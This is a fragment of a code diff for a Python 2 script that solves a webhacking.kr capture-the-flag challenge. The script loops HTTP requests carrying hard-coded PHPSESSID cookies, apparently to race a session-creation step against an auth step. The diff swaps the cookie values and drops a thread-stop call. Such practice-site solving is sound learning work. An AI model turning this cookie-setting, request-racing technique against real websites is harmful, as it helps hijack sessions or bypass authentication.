@@ -9,7 +9,7 @@ createThread = None
 def requestAuth():
     while True:
         challengeUrl = "http://webhacking.kr/challenge/web/web-37/index.php?mode=auth"
-        CookieManager.addCookie("PHPSESSID", "eabcdebaaabceddaabeabddefcabcdbe")
+        CookieManager.addCookie("PHPSESSID", "aebaacacaaaaaabcaaaeadabafbccab")
         httpRequest = urllib2.Request(challengeUrl)
         httpRequest.add_header("Cookie", CookieManager.getCookie())
         
@@ -19,8 +19,8 @@ def requestAuth():
             httpResponse = httpConnection.read()
             sys.stdout.write("!")
             if httpResponse.find("Done") >= 0:
+                print
                 print "[!] Clear Challenge 60"
-                createThread.__stop()
                 break
         except:
             raise
@@ -31,7 +31,7 @@ def requestAuth():
 def requestCreate():
     while True:
         challengeUrl = "http://webhacking.kr/challenge/web/web-37/index.php"
-        CookieManager.addCookie("PHPSESSID", "eabcdebaaabceddaabeabddefcabcdbe")
+        CookieManager.addCookie("PHPSESSID", "bfeeaffbabaebabaeababababfebeaba")
         httpRequest = urllib2.Request(challengeUrl)
         httpRequest.add_header("Cookie", CookieManager.getCookie())
         
